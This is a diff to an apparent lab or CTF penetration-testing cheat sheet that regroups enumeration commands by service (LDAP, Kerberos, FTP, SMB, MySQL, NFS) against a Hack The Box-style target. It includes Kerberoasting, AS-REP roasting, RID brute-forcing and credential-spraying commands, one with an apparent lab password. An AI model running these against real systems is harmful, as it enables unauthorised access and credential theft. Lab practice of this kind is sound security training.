@@ -20,26 +20,20 @@
 
 <details>
     <summary><H4>Service Enumeration</H4></summary>
-    
+
+  <h5>Nmap Scripts</h5>
+
     nmap -Pn -sC -sV 172.16.1.10 -p22,80,139,445
+<h5>LDAP</h5>
+
     ldap=$(nmap --script "ldap* and not brute" -p 389 172.16.1.10); echo "$ldap"
-    nxc ftp 172.16.1.10 --port 21 -u 'anonymous' -p 'anonymous' --ls
-    ftp 172.16.1.10
-    anonymous
-    anonymous
-    ls -a
-    binary
-    ascii
-    nxc smb 172.16.1.10 --port 445 -u usernames -p passwords --rid-brute 10000
-    nxc smb 172.16.1.10 --port 445 -u usernames -p passwords --shares
-    impacket-smbclient domain/'user':'password'@172.16.1.10
-    shares
-    use
-    mysql -h 172.16.1.10 -u root@localhost -e 'show databases;'
     ldapsearch -H ldap://dc01.xxxxxx.xxx/ -D "xxxxxx\P.Rosa" -w 'Rosaisbest123' -b "" -s base "(objectClass=*)" | grep -v 'supported'
     ldapsearch -H ldap://dc01.xxxxxx.xxx/ -D "xxxxxx\P.Rosa" -w 'Rosaisbest123' -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" "*" | grep 'SAM' -B 4 -A 3
+<h5>Kerberos</h5>    
+
     impacket-getST -spn dc01 vintage.htb/'USERNAME':'PASSWORD'
-    /etc/krb5.conf
+
+    nano /etc/krb5.conf
     [libdefaults]
     default_realm = VINTAGE.HTB
     dns_lookup_kdc = true
@@ -52,15 +46,38 @@
     [domain_realm]
     .vintage.htb = VINTAGE.HTB
     vintage.htb = VINTAGE.HTB
+
     export KRB5CCNAME='/home/me/USERNAME@dc01@VINTAGE.HTB.ccache'
     kinit -c '/home/me/USERNAME@dc01@VINTAGE.HTB.ccache' 'USERNAME@VINTAGE.HTB'
     klist
+
     impacket-GetADUsers -dc-host dc01.vintage.htb -k vintage.htb/
     impacket-GetNPUsers -usersfile usernames domain/ -dc-ip 172.16.1.10
     impacket-GetUserSPNs -request-user "$objuser" -dc-ip 172.16.1.10 domain/username:password
     impacket-GetUserSPNs -no-preauth "$user" -usersfile usernames -dc-host 172.16.1.10 domain/
     impacket-GetUserSPNs -request -dc-ip 172.16.1.10 domain/username:password
-    
+   <h5>FTP</h5>
+
+    nxc ftp 172.16.1.10 --port 21 -u 'anonymous' -p 'anonymous' --ls
+    ftp 172.16.1.10
+    anonymous
+    anonymous
+    ls -a
+    binary
+    ascii
+   <h5>SMB</h5>
+  
+    nxc smb 172.16.1.10 --port 445 -u usernames -p passwords --rid-brute 10000
+    nxc smb 172.16.1.10 --port 445 -u usernames -p passwords --shares
+    impacket-smbclient domain/'user':'password'@172.16.1.10
+    shares
+    use
+   <h5>MySQL</h5>
+
+    mysql -h 172.16.1.10 -u root@localhost -e 'show databases;'
+
+   <h5>NFS Mounts</h5>
+   
     for x in $(showmount -e 172.16.1.10 | awk '{print $1}' | grep -v 'Export')
         do mkdir -p "/dev/shm"/mnt"$x"
         sudo mount -t nfs 172.16.1.10:"$x" "/dev/shm"/mnt"$x" -o nolock
